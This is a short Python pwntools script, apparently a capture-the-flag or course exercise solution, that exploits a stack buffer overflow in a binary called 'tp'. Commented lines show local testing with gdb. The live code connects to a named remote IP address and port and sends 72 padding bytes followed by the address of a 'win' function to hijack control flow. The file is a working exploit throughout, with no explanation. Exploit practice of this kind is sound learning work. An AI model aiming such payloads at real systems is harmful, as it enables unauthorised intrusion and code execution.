# gdb tp
# disas win => function win start from 0x00000000004011b6

# from pwn import *

# r = process('./tp')
# r.recvuntil("Your spell: ")
# targer_address = p64(0x4011b6)
# r.sendline(b'A' * 72 + targer_address)
# r.interactive()

import socket 
from pwn import *

target_host = "140.113.207.240" 
target_port = 8834
targer_address = p64(0x4011b6)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

client.connect((target_host, target_port)) 

response = client.recv(4096)

msg = b'A' * 72 + targer_address
client.send(msg)
client.send('\n'.encode()) 
 
response = client.recv(4096) 
print(response.decode())